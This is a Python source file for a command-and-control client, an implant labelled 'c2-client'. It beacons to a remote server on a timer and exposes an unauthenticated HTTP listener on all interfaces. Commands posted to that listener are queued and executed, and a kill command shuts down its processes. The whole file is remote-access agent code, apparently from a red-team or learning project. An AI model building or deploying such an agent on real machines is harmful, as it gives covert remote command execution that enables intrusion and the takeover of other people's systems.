import os
from multiprocessing import Process, Queue
from typing import Iterable

import uvicorn
from beacon import beacon
from fastapi import FastAPI
from logger import LOGGING_CONFIG, keyboard_interrupt_handler, setup_logger
from schema import Command, CommandType, Message, StatusType
from settings import BEACON_INTERVAL_SECONDS, REMOTE_SERVER
from tasks import quit_app, run_command


@keyboard_interrupt_handler
def command_processor(queue: Queue, pids_to_kill_on_quit: Iterable[int]) -> None:
    while True:
        command = queue.get()
        if command.type == CommandType.RUN:
            run_command(command)

        if command.type == CommandType.KILL:
            current_process_pid = os.getpid()
            # if current_process_pid is first then it would kill
            # himself first and skip the rest
            quit_app((*pids_to_kill_on_quit, current_process_pid))


def create_listener(command_queue: Queue) -> FastAPI:
    app = FastAPI()

    @app.post("/run_command", response_model=Message)
    async def run_command(command: Command):
        command_queue.put(command)
        return Message(identifier=command.identifier, status=StatusType.RECEIVED)

    @app.post("/", response_model=None)
    async def get_beacon(msg: Message) -> None:
        # print(msg)
        ...

    return app


if __name__ == "__main__":
    setup_logger("c2-client")
    beacon_process = Process(
        target=beacon,
        kwargs=dict(server=REMOTE_SERVER, interval=BEACON_INTERVAL_SECONDS),
    )
    beacon_process.start()

    command_queue: Queue = Queue()
    main_process_pid = os.getpid()
    command_executer = Process(
        target=command_processor,
        kwargs=dict(
            queue=command_queue,
            pids_to_kill_on_quit=[main_process_pid, beacon_process.pid],
        ),
    )
    command_executer.start()
    uvicorn.run(
        create_listener(command_queue),
        host="0.0.0.0",  # noqa: S104
        port=8080,
        log_config=LOGGING_CONFIG,
        # ssl_keyfile=str(Path("../keys/key.pem")),
        # ssl_certfile=Path("../keys/cert.pem"),
    )
    command_executer.join()
    beacon_process.join()
